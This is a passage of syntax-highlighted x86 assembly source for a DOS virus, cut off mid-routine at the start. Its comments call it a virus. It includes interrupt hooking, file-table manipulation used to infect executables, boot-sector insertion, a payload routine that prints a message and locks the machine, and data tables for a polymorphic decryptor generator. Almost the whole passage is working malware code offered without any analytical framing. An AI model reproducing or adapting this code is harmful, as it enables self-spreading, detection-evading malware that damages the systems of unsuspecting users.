        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">  
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Return the al vector in es:bx</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">get_int</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Set al interrupt vector to ds:dx pointer</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">set_int</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Print message to screen</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">print_credits</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Set VGA video mode 03h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc1">;Print string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1301h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">003Ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0A0Bh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">text_birthday</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">exit_print</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Infinite loop</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_print</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get sft address in es:di</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">get_sft</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;File handle in bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Get job file table entry to es:di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">error_sft</span><span class="sc0">
</span><span class="sc1">;Exit if handle not opened</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">error_sft</span><span class="sc0">
</span><span class="sc1">;Get address of sft entry number bx to es:di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">error_sft</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;Exit with error</span><span class="sc0">
</span><span class="sc5">error_sft</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Seek to end of file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">seek_end</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Seek to beginning</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">seek_begin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Virus CRITICAL ERROR interrupt handler</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">my_int24h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc1">;Return error in function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Save all registers in the stack</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">push_all</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Restore all registers from the stack</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">pop_all</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Clear some registers before returning to host</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">zero_all</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Unhook int 03h and int 24h and clear dos infection switch</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">unhook_ints</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">running_sw</span><span class="sc4">],</span><span class="sc3">"R"</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old03h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old24h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get position of code inserted into boot sector</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">get_position</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Make a copy of file header</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">copy_header</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Copy header to buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0019h</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Polymorphic generator data buffer</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ah_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;This table contains the int 21h garbage functions</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Bh</span><span class="sc0">         </span><span class="sc1">;Read entry state</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">019h</span><span class="sc0">         </span><span class="sc1">;Get current drive</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc0">         </span><span class="sc1">;Get current date</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02Ch</span><span class="sc0">         </span><span class="sc1">;Get current time</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc0">         </span><span class="sc1">;Get dos version number</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc0">         </span><span class="sc1">;Get psp address</span><span class="sc0">
</span><span class="sc5">end_ah_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ax_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">3300h</span><span class="sc0">        </span><span class="sc1">;Get break-flag</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">3700h</span><span class="sc0">        </span><span class="sc1">;Get line-command separator</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">5800h</span><span class="sc0">        </span><span class="sc1">;Get mem concept</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">5802h</span><span class="sc0">        </span><span class="sc1">;Get umb insert</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">6501h</span><span class="sc0">        </span><span class="sc1">;Get code-page</span><span class="sc0">
</span><span class="sc5">end_ax_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Push and pop pairs</span><span class="sc0">
</span><span class="sc5">bytes_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">end_bytes_2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Steps table</span><span class="sc0">
</span><span class="sc5">step_table</span><span class="sc4">:</span><span class="sc0">       
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_subroutine</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_call_garbage</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_branch</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sub_decryptor</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">next_decryptor</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_push_g_pop</span><span class="sc0">
</span><span class="sc5">end_step_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">instruction_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_get_delta</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_load_counter</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_load_pointer</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_decrypt_one</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_inc_pointer</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inst_dec_loop</span><span class="sc0">
</span><span class="sc5">end_inst_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Address of every op-code generator</span><span class="sc0">
</span><span class="sc5">op_table</span><span class="sc4">:</span><span class="sc0">       
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">move_with_reg</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">move_imm</span><span class="sc0">     
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_exchange</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_push_pop</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">do_int_21h</span><span class="sc0">
</span><span class="sc5">end_op_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Misc data</span><span class="sc0">
</span><span class="sc5">last_fill_type</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">last_int_type</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">last_step_type</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">last_subroutine</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
